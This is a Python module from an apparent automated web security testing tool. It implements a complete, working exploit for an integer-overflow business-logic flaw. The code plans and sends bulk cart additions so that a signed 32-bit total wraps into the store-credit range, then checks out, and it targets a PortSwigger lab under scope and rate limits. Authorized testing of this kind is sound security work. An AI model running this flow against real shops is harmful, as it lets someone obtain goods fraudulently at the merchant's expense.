"""
Integer-overflow purchasing flow ("low-level logic flaw").

When the cart total is a signed 32-bit integer (in minor units), adding an item
in bulk eventually overflows it past 2^31 and wraps to a negative number. By
adding the right quantities of the available products you can land the *final*
total back inside [0, store-credit] while the expensive target is in the cart,
then check out for an unintended price.

Because the prices and the modulus are known (discovered from the catalog), the
exact add sequence is computed locally - largest items wrap the total fast, then
progressively cheaper items land it within the credit window. The plan is then
executed, the live total is re-read to confirm the model, and only then does it
check out. Robust to whatever is already in the cart (it reads the current total).
"""

from __future__ import annotations

import logging
import re

from ..core.scope import Scope, ScopeError
from ..engine.auth import AuthManager
from ..engine.http_client import RateLimiter, ScopedClient
from ..testing.schema import Severity, TestCase, TestStep, VulnClass, Verdict

logger = logging.getLogger("venom.flows.integer_overflow")

M = 2 ** 32
SIGNED_MAX = 2 ** 31
MAX_REQUESTS = 900          # safety cap on add requests

_CSRF = re.compile(r'name=["\']?csrf["\']?[^>]*?value=["\']?([^"\'\s>]+)')
_TOTAL = re.compile(r'(?i)total[^$\-]*?(-?)\$\s*(-?)([\d,]+)\.(\d{2})')


def _csrf(h):
    m = _CSRF.search(h or "")
    return m.group(1) if m else None


def _parse_total_cents(html: str) -> int | None:
    m = _TOTAL.search(html or "")
    if not m:
        return None
    sign = -1 if (m.group(1) == "-" or m.group(2) == "-") else 1
    return sign * (int(m.group(3).replace(",", "")) * 100 + int(m.group(4)))


def _signed(x: int) -> int:
    x %= M
    return x - M if x >= SIGNED_MAX else x


def plan(target_add: int, items: list[tuple[int, str]], credit: int):
    """Greedily compose `target_add` cents (±credit tolerance) from item prices,
    largest first, batches of <=99. Lands the leftover in [-credit, 0]."""
    remaining = target_add
    steps: list[tuple[str, int]] = []
    denoms = sorted(items, reverse=True)          # (price, productId) desc
    guard = 0
    while remaining > 0 and guard < 5000 and len(steps) < MAX_REQUESTS:
        guard += 1
        for price, pid in denoms:
            if price <= 0 or price > remaining + credit:   # would overshoot below -credit
                continue
            q = min(99, (remaining + credit) // price)
            if q < 1:
                continue
            steps.append((pid, q))
            remaining -= q * price
            break
        else:
            break
    return steps, remaining


def _find_cart(registry):
    for e in registry:
        if (e.method.upper() == "POST" and "cart" in e.path.lower()
                and any(p.name.lower() in ("quantity", "qty") for p in e.parameters)):
            return e.path
    return "/cart" if registry.catalog else None


async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
    cart_path = _find_cart(registry)
    if not cart_path or len(registry.catalog) < 2:
        return []
    catalog = {pid: int(price) for pid, price in registry.catalog.items() if int(price) > 0}
    if len(catalog) < 2:
        return []
    target_id = max(catalog, key=catalog.get)     # the expensive target (jacket)
    credit = registry.store_credit or 10000
    checkout = cart_path.rstrip("/") + "/checkout" if not cart_path.endswith("/cart") else "/cart/checkout"
    limiter = RateLimiter(scope.rate_limit_per_second)

    try:
        lab = ScopedClient(scope, scope.authorized_base_urls[0], role="overflow",
                           limiter=limiter, transport=transport)
    except ValueError:
        return []
    if scope.identities:
        try:
            lab.apply_auth(await AuthManager(scope, transport=transport).ensure(scope.identities[0]["name"]))
        except Exception as exc:  # noqa: BLE001
            logger.warning("overflow flow auth failed: %s", exc)

    async def add(pid, qty):
        await lab.request("POST", cart_path,
                          data={"productId": pid, "redir": "PRODUCT", "quantity": str(qty)},
                          follow_redirects=True)

    async def total():
        r = await lab.request("GET", "/cart", follow_redirects=True)
        return _parse_total_cents(r.text if r else ""), _csrf(r.text if r else "")

    steps_run: list[TestStep] = []
    try:
        await add(target_id, 1)                    # ensure the target is in the cart
        t0, _ = await total()
        if t0 is None:
            return []
        cur = t0 % M
        if not (0 <= _signed(cur) <= credit):
            target_add = (M - cur) % M             # cents to add to wrap total to ~0 (mod 2^32)
            items = [(p, pid) for pid, p in catalog.items()]
            steps, remaining = plan(target_add, items, credit)
            req_count = len(steps)
            if remaining < -credit or remaining > credit or req_count >= MAX_REQUESTS:
                logger.info("overflow plan did not converge (remaining=%s, reqs=%s)", remaining, req_count)
                return []
            logger.info("overflow: target_add=%d cents via %d batched add(s) (jacket=%d, credit=%d)",
                        target_add, req_count, catalog[target_id], credit)
            steps_run.append(TestStep(step=1, description=f"add target {target_id} ×1", method="POST", path=cart_path))
            for pid, q in steps:
                await add(pid, q)
            steps_run.append(TestStep(step=2,
                              description=f"overflow total via {req_count} batched adds (≤99 each)",
                              method="POST", path=cart_path))

        # Verify the model matches the server before committing.
        tf, ck = await total()
        if tf is None or not (0 <= _signed(tf) <= credit):
            logger.info("overflow: final total %s not within credit - aborting checkout", tf)
            return []
        await lab.request("POST", checkout, data={"csrf": ck}, follow_redirects=True)
        steps_run.append(TestStep(step=3, description=f"checkout at total {_signed(tf)} cents",
                                  method="POST", path=checkout))
        home = await lab.request("GET", "/", follow_redirects=True)
        solved = bool(home and "is-solved" in (home.text or ""))

        return [TestCase(
            test_id="OVF-001",
            vulnerability_class=VulnClass.PARAM_POLLUTION,
            hypothesis=("Low-level logic flaw: the cart total is a signed 32-bit integer; "
                        "adding items in bulk overflows it, landing the final total within "
                        f"store credit ({credit} cents) with the target in the cart."),
            risk_rating=Severity.HIGH,
            affected_endpoint=f"POST {cart_path}",
            business_impact="Buy expensive goods for an unintended price via integer overflow.",
            steps=steps_run,
            origin="flow",
            # Only claim a confirmed exploit when the win-oracle actually fired.
            verdict=Verdict.CONFIRMED_EXPLOIT if solved else Verdict.NEEDS_REVIEW,
            notes=["LAB SOLVED (is-solved)" if solved else f"order placed at total {_signed(tf)} cents"],
            rag_source="PortSwigger: Low-level logic flaw / WSTG-BUSL-01",
        )]
    except ScopeError as exc:
        logger.warning("overflow flow blocked by scope: %s", exc)
        return []
    finally:
        await lab.aclose()
